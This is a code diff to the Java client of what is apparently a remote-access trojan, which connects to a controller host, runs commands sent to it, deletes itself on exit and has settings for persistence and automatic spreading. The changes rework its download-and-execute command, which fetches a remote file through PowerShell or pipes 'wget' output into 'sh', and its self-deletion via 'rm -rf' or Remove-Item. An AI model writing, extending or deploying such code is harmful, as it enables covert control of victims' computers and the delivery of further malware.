@@ -14,10 +14,7 @@ import java.awt.datatransfer.DataFlavor;
 import java.awt.datatransfer.StringSelection;
 import java.awt.image.BufferedImage;
 import java.io.*;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.net.URI;
-import java.net.URL;
+import java.net.*;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
@@ -119,7 +116,8 @@ public class Client {
             if (debugMode){
                 System.out.println(" === AES KEY: " + aesKey);
                 System.out.println(" === Debug Mode: true");
-                System.out.println(" === Host: " + HOST);
+                System.out.println(" === Host: " + HOST + ":" + PORT);
+                System.out.println(" === Java version: " + JRE_VERSION);
             }
 
             while (true) {
@@ -243,8 +241,8 @@ public class Client {
                 } else if (input.contains("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-                    if (SYSTEMOS.contains("wind")){
-                        Process proc = Runtime.getRuntime().exec("del /f " + f.getAbsolutePath());
+                    if (SYSTEMOS.toLowerCase().contains("wind")){
+                        Process proc = Runtime.getRuntime().exec("powershell.exe \"Remove-Item -Force " + f.getAbsolutePath() + "\"");
                     } else {
                         Process proc = Runtime.getRuntime().exec("rm -rf " + f.getAbsolutePath());
                     }
@@ -335,19 +333,22 @@ public class Client {
                     output =  s.hasNext() ? s.next() : "No output";
                     communicate(output);
 
-                } else if (input.equals("DAE")){
+                } else if (input.contains("DAE")){
                     communicate("DAE");
                     String url = input.split(" ")[1];
-                    String fname = randTextAlpha(8);
+                    String fname = randTextAlpha(8) + url.substring(url.lastIndexOf('.'));
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                     if (SYSTEMOS.contains("Windows")){
-                        int status = execNoComm("PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "');Start-Process '" + fname + "'");
-                        if (debugMode){System.out.println("DaE status: " + status);}
-                        communicate(status);
+                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "');Start-Process '" + fname + "'";
+                        if (debugMode){System.out.println("CMD: " + cmd);}
+                        Runtime.getRuntime().exec(cmd);
+                        communicate(0);
                     } else {
                         // Probably bash/sh. Use sh just to be safe
-                        int status = execNoComm("wget '"+ url + "' -O - | sh");
-                        if (debugMode){System.out.println("DaE status: " + status);}
+                        String cmd = "wget '"+ url + "' -O - | sh";
+                        int status = 0;
+                        Runtime.getRuntime().exec(cmd);
+                        if (debugMode){System.out.println("CMD: " + cmd);}
                         communicate(status);
                     }
                     communicate(1);
@@ -503,6 +504,13 @@ public class Client {
             String[] settings = stringBuilder.toString().split(" ");
             if (settings.length == 6) {
                 HOST = (settings[0]);
+                // Change domain to ip
+                try{
+                    new URL(HOST);
+                    HOST = InetAddress.getByName(HOST).getHostAddress();
+                } catch (MalformedURLException e){
+                    // Not a valid domain, it's an ip address. Leave it be
+                }
                 PORT = (Integer.parseInt(settings[1]));
                 isPersistent = (Boolean.parseBoolean(settings[2]));
                 autoSpread = (Boolean.parseBoolean(settings[3]));
